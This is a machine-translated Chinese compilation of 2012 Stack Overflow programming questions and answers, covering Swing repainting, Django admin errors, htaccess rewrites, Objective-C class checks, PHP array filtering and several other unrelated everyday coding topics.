在 MVC 范式上，视图只能与控制器通信，并且通过盲通信（目标操作或委托/数据源）。我明白这一点，但是如果一个视图使用委托与另一个视图通信，是否违反了 MVC？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:15:52.173

我对此的看法是使用观察者设计模式并简单地使用通知（NSNotification）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:26:44.803

几乎总是。视图的委托永远不应该是另一个视图。它应该是一个控制器。控制器是在其他视图中驱动更改的适当位置。

一个视图几乎不应该说另一个视图会关心的东西。视图应该对它的代表说“我被感动了”。为什么另一个观点会关心？由控制器说“啊，这里的触摸意味着我应该移动活动焦点。我应该告诉当前活动视图放开焦点”（例如）。I view 不负责确定事件在更广泛的应用程序中的*含义，只负责确定发生了什么**事件*，因此不太可能生成其他视图感兴趣的消息。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-26T17:15:40.803

我自己是新手。但我认为不是。调用时的 jsp 页面可能会将您重定向到另一个 jsp 页面。我曾经见过这种情况发生。所以我猜它在某种程度上是一个视图调用另一个视图。

# java - 如果它被递归函数调用，paintComponent 不起作用？

> ID：10338163
> 
> 赞同：-5
> 
> 时间：2012-04-26T17:11:08.230
> 
> 标签：java, swing, paintcomponent

1.  我想看到`Points`一个又一个，但我只能看到1点。我要改变什么才能看到所有的`Points`？
2.  在`System.out`您可以看到 10 次“set”，然后 2 次“paintComponent”。每次设置后我应该改变什么？它改变了“paintComponente”？

==================================================== =================================

```
public class exampe extends JPanel  
{
    int x; 
    int y;

    public void paintComponent(Graphics g) 
    {
        super.paintComponent(g);

        Graphics2D g2 = (Graphics2D) g;
        g2.fillOval(x-2,y-2,4,4);
        System.out.println("paintComponent");        
    }

    public void set(int X, int Y)
    {
        x = X;
        y = Y;
        System.out.println("set");
        super.repaint();
    }

    public static void main(String args[]) 
    {   
        int e=1;

        JFrame frame = new JFrame("TEST");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        exampe ex= new exampe();
        JScrollPane scroll = new JScrollPane(ex);
        frame.getContentPane().add(scroll);

        frame.setSize(400, 300);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        for(int i=0; i< 10; ++i)
            ex.set(e+i,e+i);         
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T14:52:32.010

**关于为什么您只能看到最新更新的简单说明：**

*摘自 Chet Haase 和 Romain Guy 的《肮脏的富客户》*

```
It is important to note that repaint requests get “coalesced,” or combined. 
So, for example, if you request a repaint and there is already one on the 
queue that has not yet been serviced, then the second request is ignored 
because your request for a repaint will already be fulﬁlled by the earlier 
request. This behavior is particularly helpful in situations where many
repaint requests are being generated, perhaps by very different situations 
and components, and Swing should avoid processing redundant requests and 
wasting effort. 
```

试试你的手，问你有什么不清楚的地方：

```
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import javax.swing.*;

public class PointsExample
{   
    private CustomPanel contentPane;
    private Timer timer;
    private int x = 1;
    private int y = 1;
    private ActionListener timerAction = new ActionListener()
    {   
        public void actionPerformed(ActionEvent ae)
        {
            contentPane.set(x, y);
            x++;
            y++;
            if (x == 450)
                timer.stop();
        }
    };
    /*
     * This is just JFrame, that we be 
     * using as the Base for our Application.
     * Though here we are calling our
     * JPanel (CustomPanel), whose
     * paintComponent(...) method, we had
     * override.
     */
    private void createAndDisplayGUI()
    {
        JFrame frame = new JFrame("Locate Mouse Position");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        contentPane = new CustomPanel();
        frame.setContentPane(contentPane);  
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
        timer = new Timer(100, timerAction);
        timer.start();
    }

    public static void main(String\u005B\u005D args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new PointsExample().createAndDisplayGUI();
            }
        });
    }
}

class CustomPanel extends JComponent
{
    private int x;
    private int y;

    public void set(int a, int b)
    {
        x = a;
        y = b;
        repaint();
    }   

    @Override
    public Dimension getPreferredSize()
    {
        return (new Dimension(500, 500));
    }

    @Override
    public void paintComponent(Graphics g)
    { 
        g.clearRect(0, 0, getWidth(), getHeight());
        Graphics2D g2 =(Graphics2D) g;
        g2.fillOval(x, y, 4, 4);        
    }
} 
```

这是代码，它可以让您在 for 循环中迭代时查看您的观点，尽管这种方法非常不鼓励，因为它有许多与之相关的缺点。虽然试试这个而不是调用`repaint()`call [paintImmediately(int ...)](http://docs.oracle.com/javase/7/docs/api/javax/swing/JComponent.html#paintImmediately%28int,%20int,%20int,%20int%29)或[paintImmediately(Rectangle rect)](http://docs.oracle.com/javase/7/docs/api/javax/swing/JComponent.html#paintImmediately%28java.awt.Rectangle%29)

```
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import javax.swing.*;

public class PointsExample
{   
    private CustomPanel contentPane;
    private Timer timer;
    private int x = 1;
    private int y = 1;

    /*
     * This is just JFrame, that we be 
     * using as the Base for our Application.
     * Though here we are calling our
     * JPanel (CustomPanel), whose
     * paintComponent(...) method, we had
     * override.
     */
    private void createAndDisplayGUI()
    {
        JFrame frame = new JFrame("Locate Mouse Position");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        contentPane = new CustomPanel();
        frame.setContentPane(contentPane);  
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);

        for (int i = 0; i < 500; i++)
        {
            contentPane.set(x, y);
            x++;
            y++;
            if (x == 450)
                break;
        }
    }

    public static void main(String\u005B\u005D args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new PointsExample().createAndDisplayGUI();
            }
        });
    }
}

class CustomPanel extends JComponent
{
    private int x;
    private int y;

    public void set(int a, int b)
    {
        x = a;
        y = b;
        paintImmediately(0, 0, getWidth(), getHeight());

    }   

    @Override
    public Dimension getPreferredSize()
    {
        return (new Dimension(500, 500));
    }

    @Override
    public void paintComponent(Graphics g)
    { 
        super.paintComponent(g);
        g.fillOval(x, y, 4, 4);         
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:24:44.433

1：第一行`paintComponent()`应该是你的`super.paintComponent()`

2：你为什么要调用super.repaint()，简单点`repaint()`

你的卓尔精灵应该是这样的。

```
public class drow extends JPanel {
 ...........
@Override
public void paintComponent(Graphics g) {
super.paintComponent(g);
Graphics2D g2 =(Graphics2D) g;

}
public void set_list(LinkedList <point> p){
Points =p;     
repaint();
} 
```

试试这个。我希望这只是一个结构，您的paintComponent() 没有绘制任何东西。

**编辑**

```
public void set_list(LinkedList <point> p){
Points =p;     
System.out.println("set_ist");// 1:First this line will be displayed then..
repaint();//2: Then this is called, which in turn calls your `paintComponent()`
} 
```

现在，当你`paintComponent()`被调用时，它有

```
system.out.println("paintComponent");
//3: so now this will be displayed. 
```

这里的问题在哪里？

**编辑-摆动定时器**

你的代码没问题，但是函数处理比 GUI 更新快得多，这就是为什么你看不到你面前的变化。您在函数调用之间调用 thread.sleep() 以减慢调用速度的方式不是一个好方法。对于摆动中的任何计时事物，请使用摆动计时器，我更改了摆动计时器的代码。

使用摇摆定时器：

```
public class exampe extends JPanel implements ActionListener {

    int x;
    int y;
    int temp = 0;

    public void paintComponent(Graphics g) {

        super.paintComponent(g);
        Graphics2D g2 = (Graphics2D) g;
        g2.fillOval(x - 2, y - 2, 4, 4);
    }

    public void set(int X, int Y) {

        x = X;
        y = Y;
    }

    public static void main(String args[]) {

        JFrame frame = new JFrame("TEST");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        exampe ex = new exampe();
        JScrollPane scroll = new JScrollPane(ex);
        frame.getContentPane().add(scroll);
        frame.setSize(400, 300);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
        Timer PointTimer = new Timer(1000, ex);
        PointTimer.setInitialDelay(1000);
        PointTimer.start();
        System.out.println("started");
    }

    @Override
    public void actionPerformed(ActionEvent e) {

       // set(rand.nextInt(350), rand.nextInt(350));
          set(temp+10,temp+10);
          temp=temp+2;
          repaint();
    }
} 
```

# c# - c#/vb.net webbrowser获取html元素位置

> ID：10338169
> 
> 赞同：0
> 
> 时间：2012-04-26T17:11:46.647
> 
> 标签：c#, javascript, vb.net, webbrowser-control

我正在尝试获取 .net 的 webbrowser 控件中 html 元素的位置，但失败了，我需要元素相对于整个文档或 webbrowser 控件的确切位置才能使用 SendMessage() P/Invoke 发送鼠标点击..

我已经尝试过这里的解决方案，但它没有用： [getting absolute position of HTML element in webbrowser control with C#](https://stackoverflow.com/questions/5954636/getting-absolute-position-of-html-element-in-webbrowser-control-with-c-sharp)

我猜这是因为页面依赖于非常复杂的 ajax 和 css。

函数“WebBrowser1.Document.GetElementFromPoint()”在获取准确的 html 元素方面工作得很好，我只需要它的反面。

否则，我是否应该继续使用“GetElementFromPoint()”进行搜索，直到获得正确的元素？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-27T11:35:13.650

我有这个完全相同的问题。调用、.domelement.click()、.click 等...不起作用，sendmessage 确实起作用，但这需要确切的 X、Y 位置。

我目前唯一的解决方案是可怕的。基本上使用 GetElementFromPoint()，但不是逐点进行，您可以使用元素的宽度和高度的步长。

因此，如果您的元素是 500 像素高和 500 像素宽，那么您可以搜索点 0,500,1000,1500 等。

我发现了一些 jQuery 代码，这些代码显示了获得正确的 X、Y 位置实际上是多么复杂：

[https://github.com/jquery/jquery/blob/master/src/offset.js](https://github.com/jquery/jquery/blob/master/src/offset.js)

我不敢相信没有更简单的方法:-(

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T12:07:35.503

由于我无法对你的问题发表评论，我会去做一个“答案”，即使它不会是一个很大的......

*   通过 JavaScript / [InvokeMethod](http://msdn.microsoft.com/en-us/library/0t9yb2z4.aspx)单击元素有什么问题？
*   您还可以修改元素的 CSS，使其覆盖整个视口，从而允许您单击 Web 浏览器控件视口中的任何位置。

如果您要发布链接中的解决方案无法工作的原因，那么为您提供问题的解决方案会~~更容易。~~

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-21T11:49:56.837

您只需执行以下操作即可获得相同的行为：

```
public void ClickHtmlElement(WebBrowser o, string htmlElementId)
{
  const string mask = @"javascript:void(document.getElementById('{0}').click())";
  string url = string.Format(mask, htmlElementId);
  o.Navigate(url);
} 
```

# html - 将 html 类添加到 tinymce td 元素

> ID：10338173
> 
> 赞同：0
> 
> 时间：2012-04-26T17:12:07.823
> 
> 标签：html, class, tinymce, add

:)

这是我在 stackoverflow 上的第二篇文章，对我的第一个问题的结果很满意。无论如何，我已经有了一个重新设计的外观的 tinymce 工具栏。为了实现这一点，我使用 jQuery 向工具栏元素添加类。

但在某种程度上，如果在初始化工具栏时也添加了类不是更好..

假设：theme_advanced_buttons1：“保存，新文档，|，粗体，斜体，下划线，删除线，”

目前：（我现在拥有的那个）

*   启动tinymce
*   有元素时查找元素添加类

结果：

```
 <td class="first"> (*save elements here) </td>
   <td class="last"> (*newdocument elements here) </td>
   <td class="separator"> (*separator element here) </td>
   <td class="first"> (*bold elements here) </td>
   <td class="center"> (*italic elements here) </td>
   <td class="center"> (*underline elements here) </td>
   <td class="last"> (*strikethrough elements here) </td> 
```

我想要实现的目标：-启动tinymce并添加类（*结果是一样的）

这样不是更快吗？我一直在追踪tinymce的代码，但由于我缺乏编码经验，这让我更加困难......任何知道我的问题答案的人......请帮助我......谢谢你和更多的力量...... :)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T07:40:46.973

看起来您应该使用配置设置[editor_css](http://www.tinymce.com/wiki.php/Configuration%3aeditor_css)。

# vb.net - 使用 string.format 将参数附加到 URL

> ID：10338176
> 
> 赞同：0
> 
> 时间：2012-04-26T17:12:14.897
> 
> 标签：vb.net, string.format

我正在尝试将参数附加到 URL ...这是代码

```
 Function SendingRequest(item as String) As String

    Dim URL As String
    URL = String.Format("http://localhost/SomeService/Type?id={0}", item)
    WebRequest.Create(URL)
    Dim dataStream As Stream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            Return responseFromServer
            reader.Close()
            response.Close()
  End Function 
```

这没有返回响应...当我通过硬编码的 URL 时，如 WebRequest.Create("http://localhost/SomeService/Type?id=ABC") 我能够得到响应...什么可能是附加参数的问题？？？？

# c# - Screen scape 更改了来自另一个网站的信息

> ID：10338179
> 
> 赞同：0
> 
> 时间：2012-04-26T17:12:37.717
> 
> 标签：c#, asp.net

我正在尝试在单击某些项目并更改该站点上的某些数据后是否可以获得另一个站点的结果。

例如，您有一个网站首先要求您输入一些内容，然后给出结果。我想拥有这个结果并将其保存到数据库中并在我自己的网站上显示。这有什么可能吗？

我搜索了几个小时，我只能找到静态示例。

任何帮助或链接都会非常有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:45:37.120

这是可能的。使用 fiddler 来检测表单帖子（假设它是表单帖子）的样子。然后，您可以使用 HttpWebRequest 重新创建帖子并交换您的唯一值。

# python - 删除应用程序会杀死我的 Django 管理界面

> ID：10338180
> 
> 赞同：0
> 
> 时间：2012-04-26T17:12:48.633
> 
> 标签：python, django, sqlite, django-admin, sql-drop

我有一个`login`正在使用的应用程序。它在我的 sqlite3 数据库中有一个表。我决定不再需要它，并`'login',`从我的 INSTALLED_APPS 中删除并删除了应用程序目录。但是，现在每当我去时，`/admin`我都会得到：

```
ImportError at /admin/
No module named login 
```

这是因为还有一张`login`桌子吗？我怎样才能摆脱它？我试过了`python manage.py dbshell`，`drop table login;`但它说一个名为的表`login`不存在。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:23:41.797

这`ImportError`意味着存在Python 无法完成的`import login`or语句。`from ... import login`您可以在打印的回溯中检查语句的位置。它可能在已安装应用程序内的一些 admin.py 文件中。如果在登录过程中出现错误`/admin/`，您可以`AUTHENTICATION_BACKENDS`按照 Lovelive 的建议检查设置。

该错误通常与数据库表没有关系。

# java - 如何在 Java Web 应用程序中共享相同的静态数据对象？

> ID：10338181
> 
> 赞同：2
> 
> 时间：2012-04-26T17:12:57.377
> 
> 标签：java, share

我想用 Java 开发一个 Web 浏览器游戏（使用 Struts 或 Spring），但我有两个问题： - 你认为 Java 和 struts 或 Spring 是一个不错的选择吗？（如果不是，为什么？） - 一些配置数据（如行星及其属性是不可变的）应该从数据库中加载一次，并保留在所有请求共享的内存中。您对此有何建议？我应该将所有配置数据放在 servlet 上下文中吗？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:32:13.287

*假设您要创建一个 Spring App，但尚未决定选择 Struts 还是 SpringMVC。

我会推荐 Spring MVC，主要是因为如果你要选择 Spring 作为你的容器，那么你最好选择 Spring MVC，而不是把 Struts 插入 Spring Container。

关于属性：配置属性不是我不会存储在数据库中的东西。相反，我建议您创建 *.properties 文件。

您可以拥有一个具有公共静态最终 HashMap 的类。还要使 Hashmap 不可修改。使用属性文件的内容填充该 HashMap。

当然，在 Spring 应用程序中更好的方法是创建一个单例 Spring bean，它在初始化时加载属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:21:16.430

Struts 还是 Spring 好选择？是的，两者都非常成熟，拥有庞大的社区，它们是开源的（如果你需要可以查看那里的代码），你还应该查看 JSF，我个人喜欢 Primefaces（JSF 组件库），GWT 或 Eclipse RAP 是其他可用的选项.

Servlet 上下文中的配置数据：

你为什么要让你的 servlet 上下文如此繁重，你应该考虑为这种场景设置一个缓存。以[EhCache](http://ehcache.org/)为例。

根据评论：

您甚至可以尝试创建自己的缓存来保存数据库中的数据，例如保存数据的单例类，例如`Map`

# jquery - 根据 .vb 中的条件从 .js 调用 jquery 函数

> ID：10338185
> 
> 赞同：1
> 
> 时间：2012-04-26T17:13:11.473
> 
> 标签：jquery, vb.net

简而言之，我想从 .aspx.vb 页面中的 jquery.alert.js 文件中调用函数 jAlert() 。下面有更多详细信息

## “当我单击“更新页面”时，控件转到后面代码上的“ActionRepeaterItemBound”，然后转到我的 action.js 页面，这样我就可以在调用我的 jscript 函数时添加属性并使用它们。但是当我点击“提交更新”，控件首先进入 action.js，然后在后面的代码中进入“ProcessAction”。所以我不确定在控件进入 action.js 之前我需要如何添加属性。”

我有一个文件 jquery.alert.js，它具有 jAlert() 之类的功能。

我有一个文件 .aspx，其中部分代码如下

```
<asp:Repeater runat="server" ID="currentActionRepeater" OnItemDataBound="ActionRepeaterItemBound" OnItemCommand="ProcessAction">
            <ItemTemplate>
                <asp:LinkButton ID="CurrentActionCommit" runat="server" CssClass="action_method_commit" CommandName='<% #Eval("MapName").ToString() + ":" + Eval("ActionName").ToString() + ":Commit"%>' CommandArgument='<%# GetActionFolderId(Eval("FolderID")) %>' Text="Submit"/>
                <asp:LinkButton ID="CurrentActionCancel" runat="server" CssClass="action_method_cancel" CommandName='<% #Eval("MapName").ToString() + ":" + Eval("ActionName").ToString() + ":Cancel"%>' CommandArgument='<%# GetActionFolderId(Eval("FolderID")) %>' Text="Cancel"/>
            </ItemTemplate>
</asp:Repeater> 
```

我的 aspx.vb 页面具有如下功能，其中将属性添加到控件并在页面 action.js 中用于调用 jAlert 函数

```
Protected Sub ActionRepeaterItemBound(ByVal Sender As Object, ByVal e As RepeaterItemEventArgs) 
```

我希望在我的 LinkBut​​ton“CurrentActionCommit”上执行类似的逻辑。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:16:08.027

我不确定这是否是您要查找的内容，但在转发器数据绑定事件中，您可以将 onclick 事件附加到按钮。

先在repeater中找到按钮，然后添加onclick事件

```
CurrentActionCommit.Attribute.Add("OnClick","alert('Clicked')"); 
```

希望这可以帮助

# html - htaccess 重定向主域

> ID：10338186
> 
> 赞同：0
> 
> 时间：2012-04-26T17:13:13.720
> 
> 标签：html, .htaccess, redirect, web, dns

我有一个 htaccess 将我的主域“www.main.com”重定向到“www.main.com/DBS2010”。htaccess 有效，但我的网址更改为“www.main.com/DBS2010”我可以让网址保持为“www.main.com”吗？

htaccess

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(www.)?main.com$
RewriteRule ^(/)?$ DBS2010 [L] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:23:17.570

您可以为此尝试此代码：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(www\.)?main\.com$ [NC]
RewriteRule ^$ DBS2010 [L] 
```

这不会将浏览器中的 URL 更改为“/DBS2010”。

# animation - OpenGL中眼睛模型瞳孔收缩/扩张的基本方法

> ID：10338200
> 
> 赞同：3
> 
> 时间：2012-04-26T17:14:05.090
> 
> 标签：animation, opengl-es, blender, 3d-modelling

我是 OpenGL-ES 的新手，正在寻找创建逼真的眼睛模型的最佳方法，该模型的瞳孔可以扩张和收缩，因此我在阅读教程时有一个计划。

1.  我在搅拌机中制作了一个网格，它基本上是一个带孔的球体（“极点”或中心顶点被移除，并且周围有几个圆形边缘）。

2.  我计划将虹膜纹理直接添加到围绕孔的球体多边形上。

3.  要更改瞳孔大小，我是否只需要一个函数来重新定位孔的顶点以使孔扩大或收缩？

4.  我将在 Objective-C 应用程序中使用 OpenGL。我有[Jeff Lamarche 的 Objective C 导出脚本](http://iphonedevelopment.blogspot.com/2011/04/blender-257-objective-c-export-script.html)。仅从搅拌机中导出网格并稍后在 xcode 中在代码中添加纹理是标准的吗？还是先在搅拌机中设置网格上的纹理并将更多成品数据导出到 xcode 更容易/更好？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T18:57:55.560

你的问题有点老了，所以我不确定你取得了多大的进步，但是当我自己一直在攀登学习曲线时，我想我会尝试回答一下。

如果您想为模型的各个顶点设置动画，我相信您需要的方法是 Vertex Skinning。在这方面我不能说太多，因为我还没有理由尝试它，尽管它是一种仅在 OpenGL ES 2.0 中可用的技术。（无论如何，这可能是您想要开始的地方，超过 1.1 增加的灵活性比任何额外的学习曲线倾斜都值得。）

您的纹理问题的答案有些复杂。您需要在 OpenGL 中实际应用纹理。但是 Blender 可以为您做的是确定纹理坐标。网格的每个顶点都有一个与之关联的纹理坐标。纹理坐标将是映射到纹理图像上某个位置的 X、Y 坐标。坐标在 0.0 到 1.0 的范围内——因此，由于您的图像纹理是一个矩形，纹理坐标 {0, 0} 映射到左下角；{1 , 1} 映射到右上角；{0.5, 0.5} 映射到图像的确切中心。

因此，在搅拌机中，您需要继续使用 UV 映射对对象进行纹理处理。导出时，虽然导出的网格不包含任何图像内容，但它会保留映射到图像内容的纹理坐标。这将允许您在 OpenGL 中应用纹理，以便纹理的应用方式与它在搅拌机中出现的方式相同。

我个人在让 Jeff Lamarche 的脚本吐出纹理坐标时遇到了一些麻烦，因为 Blender api 似乎在每个版本中都会发生显着变化。我使用 .obj 转换器取得了更大的成功。所以我一直从搅拌机导出到.obj，并使用命令行工具从.obj 到C 头文件。

如果您在使用 Lamarche 的脚本时遇到类似问题，这篇文章可能有助于解决它：http: [//38leinad.wordpress.com/2012/05/29/blender-2-6-exporting-uv-texture-coordinates/](http://38leinad.wordpress.com/2012/05/29/blender-2-6-exporting-uv-texture-coordinates/)

这是 .obj 到 .h 脚本的一个很好的资源：http: [//heikobehrens.net/2009/08/27/obj2opengl/](http://heikobehrens.net/2009/08/27/obj2opengl/)

# jquery - 带有弹出窗口的jQuery垂直滑块中的溢出隐藏问题

> ID：10338205
> 
> 赞同：0
> 
> 时间：2012-04-26T17:14:26.527
> 
> 标签：jquery, css, popup, overflow, hidden

我正在开发一个 jQuery Vertical Slider，其中有大约 20 个拇指图像。当我单击缩略图时，会出现一个带有图像描述和详细信息按钮的弹出窗口。但问题是垂直滑块主容器有一个css属性溢出：隐藏；这不会让弹出窗口出现在容器之外。请参阅以下示例以更好地理解我的问题。

[http://jsfiddle.net/awaises/BtAsN/](http://jsfiddle.net/awaises/BtAsN/)

以下是示例图像 URL，我想让我的滑块看起来像这样。

[http://www.thewebmakerz.com/Vertical-Slider.jpg](http://www.thewebmakerz.com/Vertical-Slider.jpg)

请指导我如何解决该问题。此外，如果您知道任何以相同方式工作的示例，请参考。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:21:30.500

您可以使用 jQuery 将 html 添加到页面

例如`$('body').append('<div class="imagePopUp"> your content </div>')`

将此功能放在您的按钮单击事件上。通过这种方式，您可以在垂直滑块之外动态添加内容并将其放置在您想要的位置。

您可以使用

```
$('body').removeClass('imagePopUp') 
```

删除它。

# c++ - MFC 进度条问题和归档菜单生成

> ID：10338211
> 
> 赞同：0
> 
> 时间：2012-04-26T17:14:42.687
> 
> 标签：c++, visual-c++, mfc, progress-bar

```
void combination::OnButton2()
{
    // TODO: Add your control notification handler code here
    m_progress.SetPos(0);
    m_progress.SetRange(0,100);

    combination a;
    a.make_combinations(0);
}

void combination::make_combinations(int lo_val)
{
    srand(time(0));
    m_progress.StepIt();
    ofstream fout("combination.txt",ios::app);
    ofstream fout2("time.txt",ios::app);

    for(int i=0; i<theApp.no_of_process; i++)
    {
        //m_progress.OffsetPos(100/4);
        //m_progress.SetStep(200);
        clock_t begin = clock();
        arr[lo_val] = i;
        if (lo_val == (theApp.no_of_tasks)-1)
        {
            for (int j=0; j<theApp.no_of_tasks; j++)
            {
                int number = arr[j];
                fout << Matrix[j][number];
            }
            fout<<endl;
        }
        else
        {
            //Sleep(2);
            //make_combinations(lo_val+1);
            clock_t end = clock();
            theApp.combination_time[i][0] = (diffclock(end, begin))/1000;
            fout2 << theApp.combination_time[i][0] << endl;
        }
    }
} 
```

mfc 上有一个对话框，该按钮后面有一个按钮正在调用递归函数。我在同一个对话框上放置了一个进度条，它应该告诉我递归的进度。但是我在单击按钮时遇到错误。调试断言失败。您的程序导致断言失败。我不知道我的代码有什么问题。请帮忙！！

问题 2：我正在 MFC 上制作这个项目！它包括蛮力能力。它还具有文件处理功能！我被困在另一个点！我有几个文件写入文件！我的项目有多个文件 .txt 格式！在主 MFC 板上，我想添加一个选项来浏览那些写入的文件。他们应该以他们写的格式打开！有什么帮助吗？就像一个浏览菜单！帮助？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T16:00:21.743

断言可能是因为对话框上不存在控件，或者变量`m_progress`没有被子类化到控件。确保您`m_progress`的`DoDataExchange`函数中有一个 DDX_Control 条目。

# iphone - iPhone iOS如何将Class对象与另一个类对象进行比较？

> ID：10338213
> 
> 赞同：12
> 
> 时间：2012-04-26T17:14:55.137
> 
> 标签：iphone, objective-c, ios, class

我在使用的类之一中定义了一个类引用：

```
Class _objectClass;

     if([self.objectClass isSubclassOfClass:[NSManagedObject class]])
        {
           //does not get called
        } 
```

如何检查`Class`我正在处理的类型？

更新：抱歉，自动完成没有告诉我 isKindOfClass: 可用。我现在正在测试

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-04-26T17:19:26.183

您感兴趣的方法有两种：

`isKindOfClass:`询问接收者它是一个类*还是一个子类*，而 as`isMemberOfClass:`询问接收者它是一个类，而*不是一个子类*。例如，假设您有`NSManagedObject`一个名为 objectClass 的子类。

```
 if([self.objectClass isKindOfClass:[NSManagedObject class]]) {
     // This will return YES
 }
 else if ([self.objectClass isMemberOfClass:[NSManagedObject class]]) {
     // This will return NO
 } 
```

第一条语句返回 YES（或 true，或 1），因为 objectClass 是 NSManagedObject 的子类。第二条语句返回 NO（或 false，或 0），因为虽然它是子类，但它不是类本身。

***更新：***我想更新此答案以阐明下面的评论，该评论指出此解释是错误的，因为以下代码行：

```
if ([self.class isKindOfClass:self.class]) 
```

将返回错误。这是正确的，它会返回错误。但是这个例子是错误的。每个继承自 NSObject 的类也符合 NSObject 协议。在这个协议中有一个被称为`class`“返回接收者类的类对象”的方法。在这种情况下， self.class 返回任何类对象 self 。但是，从文档中`isKindOfClass:`-

> 返回一个布尔值，指示接收者是给定类的实例还是从该类继承的任何类的实例。

因此，将此消息发送到 self.class（它是一个类）会返回 false，因为它是要发送到类**的实例**，而不是发送到类本身。

如果您将示例更改为

```
if([self isKindOfClass:self.class]) 
```

您将得到 YES（或 true，或 1）。

我在这里的回答假定 self.objectClass 是一个名为 objectClass的*实例的访问器。*当然，对于类的实例来说，这是一个糟糕的名称，但问题不是“我如何命名类的实例”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-31T20:03:07.653

是的，`[self.objectClass isSubclassOfClass:[NSManagedObject class]]`是正确的。如果为假，则表示所代表的类`self.objectClass`不是 的子类`NSManagedObject`。我不明白你的问题是什么，或者你在期待什么。

# entity-framework - Entity Framework 可以与 Windows 8 Windows Store 应用程序一起使用吗？

> ID：10338219
> 
> 赞同：0
> 
> 时间：2012-04-26T17:15:19.600
> 
> 标签：entity-framework, windows-8

Windows 8 现代应用程序（Metro 应用程序）能否利用带有嵌入式数据库的实体框架？如果没有，是否有更好的方法来访问和存储结构化数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T19:02:09.157

什么是*“Windows 8 现代应用”*？您是指普通的桌面/服务/Web 应用程序吗？在这种情况下，答案是肯定的。您是指 Metro 风格的应用程序吗？在这种情况下，答案是否定的。

# sql - 从代码页 1252 (ANSI) 转换为代码页 gb2312（简体中文） SQL

> ID：10338222
> 
> 赞同：-1
> 
> 时间：2012-04-26T17:15:26.247
> 
> 标签：sql, sql-server, sql-server-2008, tsql, sql-server-2005

我想在 sql 中将我的 ansi (latin) 列转换为 gb2312 (chinese)。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T19:55:28.993

*   例如，首先将该列的内容转储到文件 (.csv)
*   更改列以使用简体中文排序规则之一（请参阅 MSDN[此处](http://msdn.microsoft.com/en-us/library/ms188046.aspx)和[此处](http://msdn.microsoft.com/en-us/library/ms190920.aspx)）
*   从文件中重新导入您的列

如果没有表定义，就不能更具体。

# php - 根据值从数组中删除值？

> ID：10338226
> 
> 赞同：1
> 
> 时间：2012-04-26T17:15:39.867
> 
> 标签：php

我有一个名为“items”的父级的 PHP 数组。在该数组中，我想删除所有不包含字符串的值（我将使用正则表达式来查找）。我该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-26T17:19:46.230

```
foreach($array['items'] as $key=>$value) { // loop through the array
    if( !preg_match("/your_regex/", $value) ) {
        unset($array['items'][$key]);
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:16:55.467

您可以尝试使用[`array_filter`](http://www.php.net/manual/en/function.array-filter.php).

```
$items = array(
    #some values
);
$regex= '/^[some]+(regex)*$/i';
$items = array_filter($items, function($a) use ($regex){
    return preg_match($regex, $a) !== 0;
}); 
```

注意：这只适用于 PHP 5.3+。在 5.2 中，您可以这样做：

```
function checkStr($a){
    $regex= '/^[some]+(regex)*$/i';
    return preg_match($regex, $a) !== 0;
}

$items = array(
    #some values
);
$items = array_filter($items, 'checkStr'); 
```

# javascript - 如何在完全独立的 .js 文件中覆盖/扩展prototype.js 类

> ID：10338228
> 
> 赞同：4
> 
> 时间：2012-04-26T17:15:40.860
> 
> 标签：javascript, magento, prototypejs

我有一个prototype.js 类，我想扩展它以添加一些新函数并覆盖已经存在的几个函数。

在下面的示例中，我想添加 initAutocompleteNew 并编辑 initAutocomplete 以提醒“新”。

```
Varien.searchForm = Class.create();
Varien.searchForm.prototype = {
    initialize : function(form, field, emptyText){
        this.form   = $(form);
        this.field  = $(field);
        this.emptyText = emptyText;

        Event.observe(this.form,  'submit', this.submit.bind(this));
        Event.observe(this.field, 'focus', this.focus.bind(this));
        Event.observe(this.field, 'blur', this.blur.bind(this));
        this.blur();
    },
//////more was here

